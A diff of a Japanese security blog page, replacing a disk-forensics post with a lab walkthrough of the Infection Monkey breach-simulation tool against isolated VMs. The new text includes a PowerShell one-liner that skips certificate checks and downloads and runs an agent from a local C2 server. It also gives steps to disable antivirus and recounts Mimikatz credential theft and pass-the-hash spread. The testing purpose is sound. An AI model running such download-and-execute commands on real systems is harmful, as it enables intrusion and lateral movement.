@@ -8,87 +8,51 @@
 <meta name="generator" content="Hugo 0.40.1 with theme Tranquilpeak 0.4.3-SNAPSHOT">
 <meta name="author" content="tatsui">
 <meta name="keywords" content="">
-<meta name="description" content="コンピュータフォレンジックの中でHDDやSSDなどのディスクに対するフォレンジックを
-ディスクフォレンジックと呼びます。
-ディスクフォレンジックは大まかに下記のような手順で行われます
-
-
-調査対象の選定
-調査媒体の保全
-フォレンジック調査
-
-
-今回は既に調査対象が選定されているという前提で、調査媒体の保全作業を行ってみたいと思います。
-
+<meta name="description" content="プライベートまたはパブリックなクラウド環境の侵害をシュミレーション・評価するためのツールである
+Infection Monkeyを動かしてみました。
 ">
 
 
-<meta property="og:description" content="コンピュータフォレンジックの中でHDDやSSDなどのディスクに対するフォレンジックを
-ディスクフォレンジックと呼びます。
-ディスクフォレンジックは大まかに下記のような手順で行われます
-
-
-調査対象の選定
-調査媒体の保全
-フォレンジック調査
-
-
-今回は既に調査対象が選定されているという前提で、調査媒体の保全作業を行ってみたいと思います。
-
+<meta property="og:description" content="プライベートまたはパブリックなクラウド環境の侵害をシュミレーション・評価するためのツールである
+Infection Monkeyを動かしてみました。
 ">
 <meta property="og:type" content="article">
-<meta property="og:title" content="自宅ではじめるディスクフォレンジック">
-<meta name="twitter:title" content="自宅ではじめるディスクフォレンジック">
-<meta property="og:url" content="https://tatsui-techblog.com/2019/05/diskforensic/">
-<meta property="twitter:url" content="https://tatsui-techblog.com/2019/05/diskforensic/">
+<meta property="og:title" content="クラウド環境で使えるペネトレーションテストツール">
+<meta name="twitter:title" content="クラウド環境で使えるペネトレーションテストツール">
+<meta property="og:url" content="https://tatsui-techblog.com/2019/05/infectionmonkey/">
+<meta property="twitter:url" content="https://tatsui-techblog.com/2019/05/infectionmonkey/">
 <meta property="og:site_name" content="なないろテクノロジー">
-<meta property="og:description" content="コンピュータフォレンジックの中でHDDやSSDなどのディスクに対するフォレンジックを
-ディスクフォレンジックと呼びます。
-ディスクフォレンジックは大まかに下記のような手順で行われます
-
-
-調査対象の選定
-調査媒体の保全
-フォレンジック調査
-
-
-今回は既に調査対象が選定されているという前提で、調査媒体の保全作業を行ってみたいと思います。
-
+<meta property="og:description" content="プライベートまたはパブリックなクラウド環境の侵害をシュミレーション・評価するためのツールである
+Infection Monkeyを動かしてみました。
 ">
-<meta name="twitter:description" content="コンピュータフォレンジックの中でHDDやSSDなどのディスクに対するフォレンジックを
-ディスクフォレンジックと呼びます。
-ディスクフォレンジックは大まかに下記のような手順で行われます
-
-
-調査対象の選定
-調査媒体の保全
-フォレンジック調査
-
-
-今回は既に調査対象が選定されているという前提で、調査媒体の保全作業を行ってみたいと思います。
-
+<meta name="twitter:description" content="プライベートまたはパブリックなクラウド環境の侵害をシュミレーション・評価するためのツールである
+Infection Monkeyを動かしてみました。
 ">
 <meta property="og:locale" content="ja">
 
   
-    <meta property="article:published_time" content="2019-05-17T22:06:29">
+    <meta property="article:published_time" content="2019-05-19T10:32:44">
   
   
-    <meta property="article:modified_time" content="2019-05-17T22:06:29">
+    <meta property="article:modified_time" content="2019-05-19T10:32:44">
   
   
   
     
       <meta property="article:section" content="security">
     
-      <meta property="article:section" content="forensic">
+      <meta property="article:section" content="pentest">
+    
+      <meta property="article:section" content="cloud">
     
   
   
     
       <meta property="article:tag" content="security">
     
-      <meta property="article:tag" content="forensic">
+      <meta property="article:tag" content="pentest">
+    
+      <meta property="article:tag" content="docker">
     
   
 
@@ -101,8 +65,8 @@
 
 
 
-  <meta property="og:image" content="https://tatsui-techblog.com/img/security2.jpg">
-  <meta property="twitter:image" content="https://tatsui-techblog.com/img/security2.jpg">
+  <meta property="og:image" content="https://tatsui-techblog.com/img/pentest.jpg">
+  <meta property="twitter:image" content="https://tatsui-techblog.com/img/pentest.jpg">
 
 
 
@@ -112,14 +76,14 @@
   <meta property="twitter:image" content="https://www.gravatar.com/avatar/be76902a8801be381281839fdfc50308?s=640">
 
 
-    <title>自宅ではじめるディスクフォレンジック</title>
+    <title>クラウド環境で使えるペネトレーションテストツール</title>
 
     <link rel="icon" href="https://tatsui-techblog.com/favicon.png">
     
 
     
 
-    <link rel="canonical" href="https://tatsui-techblog.com/2019/05/diskforensic/">
+    <link rel="canonical" href="https://tatsui-techblog.com/2019/05/infectionmonkey/">
 
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
@@ -281,15 +245,15 @@ ga('send', 'pageview');
             <div class="post-header main-content-wrap text-center">
   
     <h1 class="post-title" itemprop="headline">
-      自宅ではじめるディスクフォレンジック
+      クラウド環境で使えるペネトレーションテストツール
     </h1>
   
   
   <div class="postShorten-meta post-meta">
     
-      <time itemprop="datePublished" datetime="2019-05-17T22:06:29&#43;09:00">
+      <time itemprop="datePublished" datetime="2019-05-19T10:32:44&#43;09:00">
         
-  5 17, 2019
+  5 19, 2019
 
       </time>
     
@@ -300,7 +264,9 @@ ga('send', 'pageview');
     
       <a class="category-link" href="https://tatsui-techblog.com/categories/security">security</a>, 
     
-      <a class="category-link" href="https://tatsui-techblog.com/categories/forensic">forensic</a>
+      <a class="category-link" href="https://tatsui-techblog.com/categories/pentest">pentest</a>, 
+    
+      <a class="category-link" href="https://tatsui-techblog.com/categories/cloud">cloud</a>
     
   
 
@@ -310,94 +276,119 @@ ga('send', 'pageview');
           
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
-              <p>コンピュータフォレンジックの中でHDDやSSDなどのディスクに対するフォレンジックを
-<code>ディスクフォレンジック</code>と呼びます。
-ディスクフォレンジックは大まかに下記のような手順で行われます</p>
+              <p>プライベートまたはパブリックなクラウド環境の侵害をシュミレーション・評価するためのツールである
+Infection Monkeyを動かしてみました。
+</p>
 
-<ol>
-<li>調査対象の選定</li>
-<li>調査媒体の保全</li>
-<li>フォレンジック調査</li>
-</ol>
-
-<p>今回は既に調査対象が選定されているという前提で、調査媒体の保全作業を行ってみたいと思います。</p>
-
-<p></p>
-
-<h2 id="準備するもの">準備するもの</h2>
+<h2 id="あらかじめ準備しておく環境">あらかじめ準備しておく環境</h2>
 
 <ul>
-<li>調査対象のマシン</li>
-<li>CD-R (VMイメージがある場合は必要なし)</li>
-</ul>
-
-<h2 id="ディスクイメージの作成">ディスクイメージの作成</h2>
-
-<p>OSFCloneのISOイメージをダウンロードします。</p>
-
-<p><a href="https://www.osforensics.com/tools/create-disk-images.html">https://www.osforensics.com/tools/create-disk-images.html</a></p>
-
-<p>ダウンロードが完了したらISOをCD-Rへ書き込みます。</p>
-
-<h2 id="調査媒体の保全">調査媒体の保全</h2>
-
-<p>マルウェアに感染したマシンへCD-Rを挿入し起動します。
-私の環境では前回の記事で作成したVMイメージにISOファイルをDVDドライブにマウントさせ起動しました。</p>
-
-<p>osfcloneが起動すると次のような画面が表示されます。
-<img src="https://i.imgur.com/ROmD7Fs.png" alt="" /></p>
-
-<p>ディスクイメージを保存したいので<code>2</code>と入力して<code>Enter</code>を押します。
-<img src="https://i.imgur.com/qfGYKsk.png" alt="" /></p>
-
-<p>出力形式は下記の3つから選択できます。</p>
+<li>被害者用のWindows7以上の VM
 
 <ul>
-<li>Raw (dd)</li>
-<li>EWF : Expert Witness Format</li>
-<li>AFF : Advanced Forensic Format</li>
+<li>VMWareESxi6.5の上に構築</li>
+<li>Windows Defenderとファイアーウォールを無効化</li>
+</ul></li>
+<li>感染が拡大しても問題がないネットワーク
+
+<ul>
+<li>ルータでセグメントを分離</li>
+<li>ルータ自体のパスワードを強固に設定</li>
+</ul></li>
+<li>DockerがインストールされたLinuxマシン
+
+<ul>
+<li>Ubuntu 18.04に構築</li>
+<li>docker version 18.09.6</li>
+<li>docker-compose version 1.17.1</li>
+</ul></li>
 </ul>
 
-<p>今回は圧縮率が高く取得時間が早いEWFを選択します。
-<img src="https://i.imgur.com/f8vAgpY.png" alt="" /></p>
+<h2 id="infection-monkeyのセットアップ">infection monkeyのセットアップ</h2>
 
-<p>続いてイメージ化するディスクを選択します。
-<img src="https://i.imgur.com/czAkecw.png" alt="" /></p>
+<pre><code class="language-bash">$ git clone https://github.com/guardicore/monkey
+$ monkey/docker
+$ docker-compose build
+$ docker-compose up -d
+</code></pre>
 
-<p>適切なデバイスを選択してください。
-<img src="https://i.imgur.com/Y6cMUfC.png" alt="" /></p>
+<p>Dockerを動かしているマシンのブラウザからこちらのURLにアクセスすると下記のような画面が出力されます。
+<a href="https://localhost:5000/">https://localhost:5000/</a></p>
 
-<p>次にイメージファイルを保存するパーティションを選択します。
-<img src="https://i.imgur.com/bjcpCqE.png" alt="" /></p>
+<p><img src="https://i.imgur.com/HH720sZ.png" alt="" /></p>
 
-<p>保存先のパーティションはEXT4でフォーマットしてあります。
-<img src="https://i.imgur.com/ia2kKyu.png" alt="" /></p>
+<h2 id="動作検証">動作検証</h2>
 
-<p>次にイメージの名前を変更します。
-<code>3</code>を入力したあとに<code>Enter</code>を押します。
-<img src="https://i.imgur.com/USfU3Qr.png" alt="" /></p>
+<p>検証を始める前に、VMのスナップショットを取得します。
+スナップショットを取得することで、VMが感染してもすぐに元の状態に戻すことができます。</p>
 
-<p>例えば<code>windows</code>という名前をつけて保存してみます。
-<img src="https://i.imgur.com/9Jq6xmX.png" alt="" /></p>
+<p>Infection Moncky管理画面の左側にある<code>2. Run Monkey</code>をクリックしたあと<code>Run on machine of your choice</code>をクリックすると
+powershellコマンドのワンライナーが表示されます</p>
 
-<p>Parametersを確認してSource,Destination,Image filenameが間違っていないか確認します。
-<img src="https://i.imgur.com/ATxqpiM.png" alt="" /></p>
+<p><img src="https://i.imgur.com/dZ3Yb16.png" alt="" /></p>
 
-<p>問題がなければ<code>9</code>を入力し<code>Enter</code>を押してください。
-<img src="https://i.imgur.com/olexmiC.png" alt="" /></p>
+<p>malware.batという名前で上記で表示された文字列を貼り付けます。
+私の環境では接続先が<code>172.22.0.3</code>となっていましたが、dockerを実行しているマシンのIPアドレスが<code>192.168.11.251</code>であったので、バッチファイルを少し変更しました。</p>
 
-<p>色々と質問されますがEnterを押し続けて問題ないです。
-質問に回答したらイメージの取得が開始します。
-<img src="https://i.imgur.com/oNhU3GY.png" alt="" /></p>
+<pre><code>powershell [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; (New-Object System.Net.WebClient).DownloadFile('https://192.168.11.251:5000/api/monkey/download/monkey-windows-32.exe','.\monkey.exe'); ;Start-Process -FilePath '.\monkey.exe' -ArgumentList 'm0nk3y -s 192.168.11.251:5000';
+</code></pre>
 
-<p>進捗率が100%になったらEnterを押してメインメニューへ戻り
-shutdownします。
-<img src="https://i.imgur.com/OnkoFW2.png" alt="" /></p>
+<p>バッチファイルは<code>管理者権限</code>で実行します。
+<img src="https://i.imgur.com/gRU7RoS.png" alt="" /></p>
+
+<p>実行するとコマンドプロンプトが起動し、メッセージがたくさん表示されます。
+この時点でウイルスを検知される場合はアンチウイルスを無効化し再度実行します。</p>
+
+<p><code>
+環境によってはアンチウイルスをアンインストールする必要があります。
+</code></p>
+
+<p><img src="https://i.imgur.com/QQMKovj.png" alt="" /></p>
+
+<p>Infection Monkeyの管理画面のInfectionMapを見ると、感染したWindowsマシンが描画されます。
+MonkeyIslandはC2サーバです。MonkeyIslandから灰色の線で結ばれているマシンはC2サーバから遠隔操作されています。</p>
+
+<p><img src="https://i.imgur.com/EpqFdmX.png" alt="" /></p>
+
+<p>しばらく待っているとWindowsサーバにも感染を広げてきました。
+Mimikatzを使って認証情報を奪われ、Pass the Hash攻撃をされたようです。
+<img src="https://i.imgur.com/Q8pxKFX.png" alt="" /></p>
+
+<p>さらに放置するとスキャンを繰り返し侵入を拡大しようとしていきます。
+<img src="https://i.imgur.com/HpNOMZ1.png" alt="" /></p>
+
+<p>その後30分ぐらい放置すると、WindowsだけでなくLinuxにまで侵入されました。
+侵入されたマシンにはsshがインストールされており、ユーザ名が<code>user</code> パスワードが<code>password</code>となっていました。
+<img src="https://i.imgur.com/HNLX2fD.png" alt="" /></p>
+
+<p>侵入されたホストのプロセスを確認するとmonkeyというプロセスが動いていることが確認できます。</p>
+
+<h4 id="windowsの場合">Windowsの場合</h4>
+
+<p><img src="https://i.imgur.com/RtMEubB.png" alt="" /></p>
+
+<h4 id="linuxの場合">Linuxの場合</h4>
+
+<p><img src="https://i.imgur.com/qtRHQbN.png" alt="" /></p>
+
+<h2 id="レポート出力">レポート出力</h2>
+
+<p>4 Security Reportをクリックすると
+シュミレーションの結果を評価したレポートが出力されます
+<img src="https://i.imgur.com/cXDNudh.png" alt="" /></p>
+
+<p>ネットワーク図の表示は見辛いですね。。。
+<img src="https://i.imgur.com/ntpTJb2.png" alt="" /></p>
 
 <h2 id="最後に">最後に</h2>
 
-<p>今回はCD-Rから起動することでオペレーティングシステム環境にログを残すことなくディスクの内容を別の媒体へコピーしました。
-次回は保全したディスクイメージを解析するフォレンジック調査を実践してみたいと思います。</p>
+<p>MetasploitやNessusのような脆弱性スキャナーに比べると、ラテラルムーブメントのような
+内部偵察、資格奪取、感染拡大まで自動化できるのが本ツールの特徴でした。
+Exploitモジュールは他の脆弱性スキャナに比べると<a href="https://github.com/guardicore/monkey/tree/develop/monkey/infection_monkey/exploit">明らかに少ない</a>ですが、Pythonで書かれているため個人的には拡張性が高いと思っています。</p>
+
+<p>余談ですが、<a href="https://tatsui-techblog.com/2019/05/wazuh/">前回の記事</a>で構築したWazuhのログを見ても、Infection Monckyで攻撃されている間のログはほとんど取れていませんでした。
+EDRのような使い方はまだ期待できないようですね。
+<img src="https://i.imgur.com/yraL2wG.png" alt="" /></p>
               
             </div>
           </div>
@@ -411,7 +402,9 @@ shutdownします。
                     
   <a class="tag tag--primary tag--small" href="https://tatsui-techblog.com/tags/security/">security</a>
 
-  <a class="tag tag--primary tag--small" href="https://tatsui-techblog.com/tags/forensic/">forensic</a>
+  <a class="tag tag--primary tag--small" href="https://tatsui-techblog.com/tags/pentest/">pentest</a>
+
+  <a class="tag tag--primary tag--small" href="https://tatsui-techblog.com/tags/docker/">docker</a>
 
                   </div>
                 
@@ -424,7 +417,7 @@ shutdownします。
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://tatsui-techblog.com/2019/05/wazuh/" data-tooltip="オープンソースで構築するEDR">
+                <a class="post-action-btn btn btn--disabled">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">次</span>
@@ -432,7 +425,7 @@ shutdownします。
             </li>
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://tatsui-techblog.com/2019/05/es7/" data-tooltip="Dockerを使ってElasticsearch7.0のクラスタを作ってみる">
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://tatsui-techblog.com/2019/05/wazuh/" data-tooltip="オープンソースで構築するEDR">
               
                   <span class="hide-xs hide-sm text-small icon-mr">前</span>
                   <i class="fa fa-angle-right"></i>
@@ -450,13 +443,13 @@ shutdownします。
         </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://tatsui-techblog.com/2019/05/diskforensic/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://tatsui-techblog.com/2019/05/infectionmonkey/">
               <i class="fa fa-twitter"></i>
             </a>
           </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://tatsui-techblog.com/2019/05/diskforensic/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://tatsui-techblog.com/2019/05/infectionmonkey/">
               <i class="fa fa-facebook-official"></i>
             </a>
           </li>
@@ -504,7 +497,7 @@ shutdownします。
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://tatsui-techblog.com/2019/05/wazuh/" data-tooltip="オープンソースで構築するEDR">
+                <a class="post-action-btn btn btn--disabled">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">次</span>
@@ -512,7 +505,7 @@ shutdownします。
             </li>
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://tatsui-techblog.com/2019/05/es7/" data-tooltip="Dockerを使ってElasticsearch7.0のクラスタを作ってみる">
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://tatsui-techblog.com/2019/05/wazuh/" data-tooltip="オープンソースで構築するEDR">
               
                   <span class="hide-xs hide-sm text-small icon-mr">前</span>
                   <i class="fa fa-angle-right"></i>
@@ -530,13 +523,13 @@ shutdownします。
         </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://tatsui-techblog.com/2019/05/diskforensic/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://tatsui-techblog.com/2019/05/infectionmonkey/">
               <i class="fa fa-twitter"></i>
             </a>
           </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://tatsui-techblog.com/2019/05/diskforensic/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://tatsui-techblog.com/2019/05/infectionmonkey/">
               <i class="fa fa-facebook-official"></i>
             </a>
           </li>
@@ -566,13 +559,13 @@ shutdownします。
   <ul class="share-options">
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Ftatsui-techblog.com%2F2019%2F05%2Fdiskforensic%2F">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Ftatsui-techblog.com%2F2019%2F05%2Finfectionmonkey%2F">
           <i class="fa fa-twitter"></i><span>Twitterで共有</span>
         </a>
       </li>
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftatsui-techblog.com%2F2019%2F05%2Fdiskforensic%2F">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftatsui-techblog.com%2F2019%2F05%2Finfectionmonkey%2F">
           <i class="fa fa-facebook-official"></i><span>Facebookで共有</span>
         </a>
       </li>
@@ -777,9 +770,9 @@ $(document).ready(function() {
     
       <script>
         var disqus_config = function () {
-          this.page.url = 'https:\/\/tatsui-techblog.com\/2019\/05\/diskforensic\/';
+          this.page.url = 'https:\/\/tatsui-techblog.com\/2019\/05\/infectionmonkey\/';
           
-            this.page.identifier = '\/2019\/05\/diskforensic\/'
+            this.page.identifier = '\/2019\/05\/infectionmonkey\/'
           
         };
         (function() {
